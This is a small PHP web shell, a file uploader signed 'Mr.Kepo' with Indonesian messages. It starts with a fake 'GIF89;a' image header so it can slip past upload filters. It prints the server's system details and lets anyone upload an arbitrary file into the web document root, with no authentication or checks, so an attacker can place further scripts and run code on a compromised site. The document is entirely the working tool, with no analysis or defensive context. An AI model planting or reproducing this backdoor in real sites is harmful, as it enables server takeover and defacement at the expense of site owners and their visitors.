GIF89;a

<html>
<center>
<body bgcolor="#b18b8a">
    <br><br><br>
    <img src="https://i.pinimg.com/564x/0b/1a/04/0b1a043f091158101679ee095636b2df.jpg"width="300"><br><br>
    <i><h2>< / >  Mr.Kepo  < / ></h2></i>
<font color="black"></center><br>
    <center>
<?php
echo "<i><b>Home Root Mini Uploader<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='Tusbold!'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Upload Sukses! <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "Gagal Upload Di Document Root.";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "Sukses Upload <b>$files</b> Di Folder Ini";
        } else {
            echo "Upload Gagal!";
        }
    }
}
?>